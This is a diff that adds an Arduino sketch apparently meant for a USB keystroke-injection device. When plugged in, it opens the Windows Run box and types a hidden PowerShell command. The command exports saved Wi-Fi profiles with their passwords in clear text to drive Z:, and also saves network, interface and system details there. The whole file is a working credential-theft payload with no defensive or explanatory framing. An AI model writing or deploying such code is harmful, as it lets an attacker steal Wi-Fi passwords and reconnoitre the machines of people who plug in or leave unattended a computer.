@@ -1,0 +1,21 @@
+#include <Keyboard.h>
+
+void setup() {
+  delay(3000);
+  Keyboard.begin();
+  
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+
+  Keyboard.print("powershell -WindowStyle Hidden -Command \"cd Z:\\; netsh wlan show profiles > wifi_list.txt; netsh wlan export profile folder='Z:\\' key=clear; netsh wlan show interfaces > wifi_info.txt; ipconfig /all > network_info.txt; systeminfo > system_info.txt\"");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  
+  Keyboard.end();
+}
+
+void loop() {}
